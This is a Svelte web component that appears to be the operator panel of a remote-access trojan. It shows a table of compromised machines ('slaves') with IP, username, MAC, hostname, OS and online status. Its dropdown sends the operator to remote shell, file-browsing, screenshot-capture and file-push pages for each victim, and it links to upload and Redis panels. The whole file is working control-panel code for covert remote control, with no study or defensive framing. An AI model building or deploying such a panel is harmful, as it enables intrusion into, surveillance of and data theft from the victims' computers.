<script>
    export let slaves;
	let mac = '';
	import RedisIcon from '/src/redis.png';
	import UploadIcon from '/src/upload.png';
	let selectedAction = 'Choose Action';
	import LogoutBtn from './Logout.svelte';

	import {secondsToHms} from '../components/util.js';
	import {ONLINE_SECONDS_THRESHOLD} from '../config.js';
	import { ACTION_TYPE_SHELL, ACTION_TYPE_FILEBROWSE, ACTION_TYPE_SCREENSHOT, ACTION_TYPE_GETFILEURL } from '../config.js'

    function getLastSeenInSeconds(timestamp){
		let seconds = (new Date().getTime()/1000)-timestamp;
		seconds = seconds.toFixed(2);
		return secondsToHms(seconds);
	}

	function showSelectedAction(info){
		switch(selectedAction) {
  			case ACTION_TYPE_SHELL:
			  runShellCommand(info.mac);
			break;
			case ACTION_TYPE_FILEBROWSE:
				runFileBrowseCommand(info.mac,info.ostype)
			break;
			case ACTION_TYPE_SCREENSHOT:
				getScreenShot(info.mac);
			break;
			case ACTION_TYPE_GETFILEURL:
				getFileUrl(info.mac);
			break;
		}
	}
	function getOnlineStatus(timestamp){
		let seconds = (new Date().getTime()/1000)-timestamp;
		seconds = seconds.toFixed(2);

		if(seconds < ONLINE_SECONDS_THRESHOLD){
			return '<div style="background-color:green;color:white;padding:10px">ONLINE</div>';
		}
		else{
			return '<div style="background-color:red;color:white;padding:10px">OFFLINE</div>';
		}
	}

	function getScreenShot(mac){
		window.location.href="/screenshot?mac="+mac;
	}

	function getFileUrl(mac){
		window.location.href="/getfileurl?mac="+mac;
	}

	async function runShellCommand(mac){
		window.location.href="/shell?mac="+mac;
	}

	async function runFileBrowseCommand(mac,ostype){
		window.location.href="/filebrowseV2?mac="+mac+"&ostype="+ostype;
	}
</script>
<section>
	<LogoutBtn/>
	<div class="top_banner">
		<h1 class="banner"> List of connections </h1>
		<div>
			<img src={UploadIcon} width="50" height="50" on:click={()=>{window.location.href="/panel/upload"}} class="img-link"/>
			<img src={RedisIcon} width="50" height="50" on:click={()=>{window.location.href="/redispanel"}} class="img-link"/>
		</div>
	</div>
	<table class="conn_list">
		<tr>
		  <th>IP Address</th>
		  <th>Username</th>
		  <th>MAC Address</th>
		  <th>Hostname</th>
		  <th>OS</th>
		  <th>Last Seen </th>
		  <th>Status</th>
		  <th>Action </th>
		</tr>
		{#each slaves as { ip, username, mac, hostname, os, ostype, timestamp }, i}
		<tr>
			<td class="dark">{ip}</td>
			<td class="light">{username}</td>
			<td class="dark">{mac}</td>
			<td class="light">{hostname}</td>
			<td class="dark">{os}</td>
			<td class="light">{getLastSeenInSeconds(timestamp)}</td>
			<td>
				{@html getOnlineStatus(timestamp)}
			</td>
			<td>
				<select name="action" class="dropdown" bind:value={selectedAction} on:change={()=>{showSelectedAction(
					{
						mac: mac,
						ostype: ostype
					}
				)}}>
					<option value="SHELL">Run Shell</option>
					<option value="FILEBROWSE">File Browser</option>
					<option value="SCREENSHOT">Take Screenshot</option>
					<option value="GETFILEURL">Download File to Slave</option>
				  </select>
			</td>
		  </tr>
		{/each}
	  </table> 
</section>

<style>
	.img-link{
		cursor: pointer;
		border: 2px solid white;
	}
	.img-link:hover{
		border: 2px solid crimson;
	}
	.banner{
		font-family: 'Open Sans', sans-serif;
	}
	.top_banner{
		display: grid;
		grid-template-columns: 8fr 2fr;
		text-decoration: none;
	}
	.dropdown{
		height: 40px;
	}
	.conn_list{
		border: 0px;
	}
	td{
		border:0px solid;
		font-family: 'Roboto', sans-serif; 
		padding: 10px;
	}
	th{
		border:0px;
		background-color: #fac146;
		font-family: 'Roboto', sans-serif; 
		padding: 10px;
	}
	.dark{
		background-color: #0ad8f7;
	}
	.light{
		background-color: #82ffea;
	}
	.redbtn{
		background-color: black;
		color:whitesmoke;
		padding:10px;
		border-radius: 4px;
		border:0px;
	}
	.redbtn:hover{
		background-color:crimson;
	}
</style>
